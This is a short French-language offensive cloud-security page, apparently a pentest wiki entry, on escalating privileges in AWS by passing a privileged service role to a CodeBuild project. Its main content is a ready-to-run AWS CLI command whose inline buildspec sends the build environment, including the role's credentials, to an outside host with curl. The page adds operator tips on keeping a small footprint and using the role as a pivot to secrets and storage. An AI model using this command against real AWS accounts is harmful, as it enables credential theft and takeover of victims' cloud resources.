---
title: "CodeBuild : PassRole vers un rôle de service de projet de build"
description: "iam:PassRole vers un projet CodeBuild pour exécuter des commandes buildspec sous un rôle de service privilégié."
keywords:
  - PassRole
  - CodeBuild
  - buildspec
  - rôle de service
  - build
---

# CodeBuild

Un projet CodeBuild exécute un `buildspec` sous un **rôle de service**. Avec `iam:PassRole` et `codebuild:CreateProject` plus `StartBuild`, vous passez un rôle privilégié et fournissez un buildspec dont les commandes s'exécutent avec les identifiants de ce rôle, exposés à l'environnement de build via la chaîne de fournisseurs d'identifiants standard.

## Créer et exécuter un projet

```bash
aws codebuild create-project --name x \
  --service-role arn:aws:iam::<acct>:role/<privileged-role> \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity\n      - curl -X POST -d \"$(env)\" https://you.example"}'
aws codebuild start-build --project-name x
```

Le build exécute vos commandes en tant que rôle de service ; récupérez ses identifiants depuis l'environnement et poursuivez.

## Notes d'exploitation

- Un buildspec `NO_SOURCE` inline évite de mettre en place un dépôt, limitant l'empreinte à deux appels d'API.
- Les rôles de service CodeBuild détiennent fréquemment des autorisations de déploiement (push ECR, écriture S3, Secrets Manager), de sorte que le rôle constitue souvent un solide pivot.

## Outils

- **AWS CLI** (`codebuild create-project` / `start-build`).
- **Pacu** : module privesc CodeBuild.

## Références

- [Rhino Security Labs: AWS privilege escalation (CodeBuild)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS CodeBuild privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-codebuild-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
